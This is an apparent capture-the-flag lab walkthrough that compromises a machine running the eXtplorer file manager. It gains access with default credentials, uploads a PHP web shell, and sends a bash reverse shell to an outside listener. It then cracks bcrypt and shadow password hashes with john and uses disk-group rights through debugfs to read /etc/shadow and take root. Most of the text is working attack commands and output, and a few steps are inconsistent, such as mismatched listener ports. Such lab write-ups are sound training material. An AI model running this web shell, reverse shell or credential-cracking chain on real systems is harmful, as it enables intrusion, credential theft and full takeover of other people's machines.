____

# Exploitation Guide For Extplorer

## Summary:

In this guide, we will exploit a file upload vulnerability in order to establish our initial foothold. We will escalate privileges by thoroughly enumerating the machine to discover a configuration file containing credentials and abuse the permissions of a user who is a member of a privileged group.

## Enumeration

We begin the enumeration process with an `Nmap` scan.

```
$ nmap -T4 192.168.120.42 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 06:30 MST
Nmap scan report for 192.168.120.42
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We see ports `22` and `80` open and running on the target machine.

Starting with port `80`, we see the following Wordpress installation page.

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_160_image_1_ZDT4Ear2.png)

Turning our attention to content discovery, we use `gobuster` to enumerate interesting directories.

From the output we see the `/filemanager` directory and view the following login page:

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_160_image_2_EFT1HYV3.png)

We are able to authenticate with the credentials `admin:admin`.

After gaining access, we are greeted with a dashboard that allows us to upload and modify files.

We proceed by creating a file titled `shell.php`, with the following contents:

```
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

We have confirmed code execution as the `www-data` user.

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_160_image_3_VF7HYX2L.png)

Now we will attempt to spawn a reverse shell.

We begin by setting up a listener on our attack machine.

```
$ nc -lvnp 443
listening on [any] 443 ...
```

Now we create a file containing a typical reverse shell payload.

```
$ cat revshell.sh 
 bash -i >& /dev/tcp/10.9.1.11/4444 0>&1
```

Now we start a python webserver on our attack machine.

```
$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Finally we receive a response in our listener as `www-data`.

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 4444
listening on [any] 4444 ...
...
www-data@dora:/var/www/html$ 
```

# Privilege Escalation

While enumerating for any potentially interesting files we discover a set of credentials in `/var/www/html/filemanager/config/.htusers.php`.

```
www-data@dora:/var/www/html/filemanager/config$ cat .htusers.php
cat .htusers.php
<?php 
	// ensure this file is being included by a parent file
	if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
	$GLOBALS["users"]=array(
	array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
	array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
);
```

From the output we see the hash: `$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS`

We proceed by copying the file to our attack machine and use `john` to crack the hash.

```
$ cat hash      
$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS
$ john hash --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (?)     
1g 0:00:00:07 DONE (2023-04-11 05:18) 0.1369g/s 207.1p/s 207.1c/s 207.1C/s goober..something
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

From the output we see the password `doraemon`.

We are now able to authenticate as the `dora` user.

Using the `id` command, we notice that we are a member of the `disk` group.

```
www-data@dora:/home su dora
su dora
Password:
...
$ id
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

This privilege is allows us to access all data inside of the machine.

```
dora@dora:/home$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
udev                               947M     0  947M   0% /dev
tmpfs                              199M  1.2M  198M   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.3G  55% /
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop1                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop4                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/0
dora@dora:/home$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)
debugfs:
```

We proceed by viewing the `/etc/passwd` and `/etc/shadow` files on the system.

```
debugfs:  cat /etc/shadow
cat /etc/shadow
root:$6$a2QQgnuRVVKcj4Td$RV9HstTFog5YhroH0sbXbyPoTLnhd8fWFZVCFgumPxkevkALWo17xJ05VPvJbofR0FKy5en16/
....
debugfs:  cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
....
```

We copy the files to our attack machine, and proceed to format them using the `unshadow` command in order to crack the hashes using `john`.

```
$ cat passwd 
root:x:0:0:root:/root:/bin/bash
....
$ cat shadow 
root:$6$a2QQgnuRVVKcj4Td$RV9HstTFog5YhroH0sbXbyPoTLnhd8fWFZVCFgumPxkevkALWo17xJ05VPvJbofR0FKy5en16/QbuVSiK290i1:19458:0:99999:7:::
....
```

Now we crack the hashes using `john`.

```
~ john unshadow --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (dora)  
explorer         (root)
....   
```

From the output we see the password `explorer`.

We can authenticate using `root:explorer` in order to obtain root access.

```
dora@dora:/home$ su
su
Password: explorer

root@dora:/home# id
id
uid=0(root) gid=0(root) groups=0(root)
```
